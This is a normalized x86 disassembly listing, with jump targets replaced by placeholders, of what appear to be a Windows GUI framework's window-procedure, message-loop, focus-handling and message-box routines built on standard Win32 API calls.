cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4189b0
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_46e4d4
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4189b0
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_46e570
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40cb54
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_46d52c
mov eax [ rw-data ]
call sub_46db74
sub_46e5c8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e625
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e62c
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_4042a4
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_46e634
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_46e670
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46edc0
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_46e6bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_403778#5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46e570
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_46f7dc
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_4189b0
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_456054
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_470708
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46f2f8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46f29c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_456054
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46edc0
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_46db74
push ebp
call sub_46e634
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_46e634
pop ecx
jmp [ eax * 4 + jump_table_46e760 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_456054
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46f174
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45aa10
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46e5c8
push ebp
call sub_46e634
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_46e634
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_46e634
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_420c3c
jmp r-xdata
xor eax eax
call sub_4664d8
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_456054
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_450a20
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46eddc
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_46e634
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_46bd74
jmp r-xdata
push ebp
call sub_46e634
pop ecx
jmp r-xdata
push ebp
call sub_46e670
pop ecx
jmp r-xdata
push ebp
call sub_46e634
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_46e4d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46ee8c
jmp r-xdata
jmp r-xdata
call sub_440198
call sub_440278
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_46e4c4
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46e4d4
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46e4cc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_466388
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_46e634
pop ecx
jmp r-xdata
call sub_46643c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_46e634
pop ecx
jmp r-xdata
call sub_440198
call sub_4402d4
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d630
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_46eddc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_46e4c4
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_46ddf4
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_456054
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_456054
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_46ee8c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_46ddf4
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_456054
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_46e4d4
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_456054
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_469b00
mov eax [ ebx + 0x44 ]
call sub_46bf1c
sub_46ef8c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_46efc8
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_404100
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_40419c
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_46f014
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_46f038
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_46f088
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_44c734
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_456054
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_46f140
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_4700a0
sub_46f174
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_456054
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_4034ac
test al al
jne r-xdata
sub_46f1e0
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_46f140
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_46f038
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46f088
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46f014
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_46f278
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_46f1e0
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_46fb48
sub_46f29c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_418990
mov eax 0x8
call sub_4026ec
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_418854
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_46f2f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4189b0
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_40270c
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4188a0
jmp r-xdata
sub_46f38c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_46f3ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_456030
mov [ esi + 0x44 ] edi
sub_46f40c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_46f4ea
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_466300
call sub_407ecc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f4f1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_469b00
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_46f4b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46f278
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_468a08
mov eax [ ebp - 0x4 ]
call sub_46eddc
jmp r-xdata
sub_46f50c
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40277c
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40279c
push eax
call sub_40277c
pop edx
call sub_40ba14
call sub_40277c
mov edx [ rw-data ]
call sub_40343c
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40277c
mov edx eax
mov eax ebx
call sub_46f704
pop esi
pop ebx
retn
call sub_40277c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_46f59c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_466388
mov [ ebp - 0x10 ] eax
call sub_4662a4
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_46e540
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_46f6f1
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f6f8
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_46643c
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_4662ac
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_46f704
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46f7bf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404144
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_46efc8
mov eax [ ebp - 0x108 ]
call sub_40456c
push eax
mov eax [ ebp - 0x4 ]
call sub_40456c
mov edx eax
mov eax ebx
pop ecx
call sub_46f59c
xor eax eax
pop edx
pop ecx
pop ecx
